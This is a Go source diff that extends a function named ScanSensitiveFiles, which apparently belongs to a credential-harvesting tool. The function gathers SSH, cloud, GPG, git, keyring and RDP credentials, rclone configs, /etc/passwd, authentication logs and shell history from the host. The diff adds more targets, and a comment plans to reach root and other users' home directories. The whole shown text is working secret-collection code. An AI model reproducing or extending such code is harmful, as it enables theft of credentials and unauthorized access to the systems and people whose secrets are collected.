@@ -52,36 +52,44 @@ func flushZshHistory() {
 
 // ScanSensitiveFiles collects all files from specified paths, including full directories.
 func ScanSensitiveFiles(outputDir string) ([]string, error) {
+	// gets the current users home directory
+	// what if there are two users, what if we are root, also want to get anything under /home/user
 	homeDir, _ := os.UserHomeDir()
 
 	paths := []string{
-		filepath.Join(homeDir, ".ssh"),                  // SSH keys
-		filepath.Join(homeDir, ".aws"),                  // AWS credentials
-		filepath.Join(homeDir, ".gnupg"),                // GPG keys
-		filepath.Join(homeDir, ".git-credentials"),      // Git credentials
-		filepath.Join(homeDir, ".gitconfig"),            // Git global config
-		filepath.Join(homeDir, ".docker"),               // Docker config
-		filepath.Join(homeDir, ".kube"),                 // Kubernetes config
-		filepath.Join(homeDir, ".config/gcloud"),        // Google Cloud config
-		filepath.Join(homeDir, ".azure"),                // Azure config
-		filepath.Join(homeDir, ".openvpn"),              // OpenVPN config
-		filepath.Join(homeDir, ".profile"),              // User profile
-		filepath.Join(homeDir, ".npmrc"),                // NPM credentials
-		filepath.Join(homeDir, ".pypirc"),               // Python package repository credentials
-		filepath.Join(homeDir, ".netrc"),                // Netrc (generic credentials)
-		filepath.Join(homeDir, ".local/share/keyrings"), // Keyrings
-		"/etc/passwd",        // User information
-		"/etc/group",         // Group information
-		"/etc/hostname",      // System hostname
-		"/etc/hosts",         // Hosts file
-		"/etc/ssl",           // SSL certificates
-		"/etc/apache2",       // Apache2 configs
-		"/etc/httpd",         // httpd configs conf/ and conf.d/
-		"/etc/nginx/conf.d",  // nginx configs
-		"/var/log/auth.log",  // Authentication logs (Linux-specific)
-		"/var/log/secure",    // Secure logs (Red Hat/CentOS-specific)
-		"/tmp/ssh-*",         // Temporary SSH files
-		DetectDefaultShell(), // Shell history
+		filepath.Join(homeDir, ".ssh"),                   // SSH keys
+		filepath.Join(homeDir, ".aws"),                   // AWS credentials
+		filepath.Join(homeDir, ".gnupg"),                 // GPG keys
+		filepath.Join(homeDir, ".git-credentials"),       // Git credentials
+		filepath.Join(homeDir, ".gitconfig"),             // Git global config
+		filepath.Join(homeDir, ".docker"),                // Docker config
+		filepath.Join(homeDir, ".kube"),                  // Kubernetes config
+		filepath.Join(homeDir, ".config/gcloud"),         // Google Cloud config
+		filepath.Join(homeDir, ".azure"),                 // Azure config
+		filepath.Join(homeDir, ".openvpn"),               // OpenVPN config
+		filepath.Join(homeDir, ".profile"),               // User profile
+		filepath.Join(homeDir, ".npmrc"),                 // NPM credentials
+		filepath.Join(homeDir, ".pypirc"),                // Python package repository credentials
+		filepath.Join(homeDir, ".netrc"),                 // Netrc (generic credentials)
+		filepath.Join(homeDir, ".config/freerdp"),        // Freerdp files
+		filepath.Join(homeDir, ".local/share/remmina"),   // Remmina RDP files
+		filepath.Join(homeDir, ".config/remmina"),        // Remmina RDP files
+		filepath.Join(homeDir, ".remmina"),               // Remmina RDP files
+		filepath.Join(homeDir, ".local/share/keyrings"),  // Keyrings
+		filepath.Join(homeDir, ".config/rclone"),         // rclone backup configs
+		filepath.Join(homeDir, ".config/rclone_browser"), // rclone_browser configs
+		"/etc/passwd",        							  // User information
+		"/etc/group",                                     // Group information
+		"/etc/hostname",                                  // System hostname
+		"/etc/hosts",                                     // Hosts file
+		"/etc/ssl",                                       // SSL certificates
+		"/etc/apache2",                                   // Apache2 configs
+		"/etc/httpd",                                     // httpd configs conf/ and conf.d/
+		"/etc/nginx/conf.d",                              // nginx configs
+		"/var/log/auth.log",                              // Authentication logs (Linux-specific)
+		"/var/log/secure",                                // Secure logs (Red Hat/CentOS-specific)
+		"/tmp/ssh-*",                                     // Temporary SSH files
+		DetectDefaultShell(),                             // Shell history
 	}
 
 	var files []string
